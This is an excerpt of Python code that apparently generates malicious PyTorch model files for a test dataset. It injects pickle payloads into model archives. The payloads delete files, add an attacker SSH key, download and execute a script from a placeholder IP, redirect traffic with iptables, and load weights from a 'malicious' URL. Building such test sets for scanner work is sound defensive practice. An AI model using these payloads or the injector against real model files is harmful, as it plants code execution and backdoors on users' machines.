...
EXEC_PRIMITIVE_PAYLOADS = {
    ...
    "subprocess.run rm data": ("subprocess.run", ["rm", "-rf", "/fakedir/data"]), # Delete local files
    "os.system add ssh priv key": ("os.system", """
...
"""), # Add attacker SSH key
    "builtins.exec subprocess download script and execute": ("builtins.exec", "subprocess.call('wget https://999.3.2.1/script.sh && ./script.sh', shell=True)"), # Download and execute malicious script
    "subprocess.check_output redirect network traffic": ("subprocess.check_output", ["iptabless", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "3124", "-j", "DNAT", "--to-destination", "1.2.3.4:4539"]), # Redirect incoming traffic
    "numpy runstring": ("numpy.testing._private.utils.runstring", '__import__("os").system("ls -la")', {}),
...
DANGEROUS_PRIMITIVE_PAYLOADS = {
    "torch load_state_dict URL": ("torch.hub.load_state_dict_from_url", "http://1.2.3.999/malicious_files.pth"),
...
def inject_pytorch_file(infile: Path, outfile: Path, payload_key: Optional[str] = None):
    ...
    for element in archive.infolist():
        if not injected and element.filename.endswith((".pkl", ".pickle", ".pk")):
            ...
            with zipfile.Path(archive, at=element.filename).open("rb") as inf, zipfile.Path(outarchive, at=element.filename).open("wb") as outf:
                res = _inject_payload(
                    inf,
                    outf,
                    payload_key,
...
def create_malicious_dataset(clean_dataset_dir: Path, outdir: Path, n: int = 10):
    ...
    with open(clean_dataset_dir / "index.json", "r") as f:
